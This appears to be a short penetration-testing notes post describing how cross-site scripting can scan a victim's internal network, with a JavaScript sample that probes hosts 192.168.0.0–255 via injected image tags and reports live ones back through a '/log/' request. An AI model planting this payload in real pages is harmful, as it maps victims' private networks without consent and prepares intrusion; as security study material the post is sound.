---
layout: post
title: XSS Port Scanning
description: XSS Port Scanning
summary: XSS Port Scanning
tags: [web,enum,foothold,xss]
minute: 1
---
## Overview
An attacker which is outside of your internal network can force you to browse a webpage containing malicuous javascript.

This javascript code will scan your internal network and sends result back to attacker.

## Sample Code
```javascript
<script>
  for (let i = 0; i < 256; i++) {
    let ip = '192.168.0.' + i

    let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
    document.body.innerHTML += code
 }
</script>
```

![](/spindel/assets/XSS%20Port%20Scanning/23CD500A-C9DD-4F00-A473-8A1F9AE4F120.png)

## References
* https://neonprimetime.blogspot.com/2015/09/cross-site-scripting-xss-that-port-scans.html
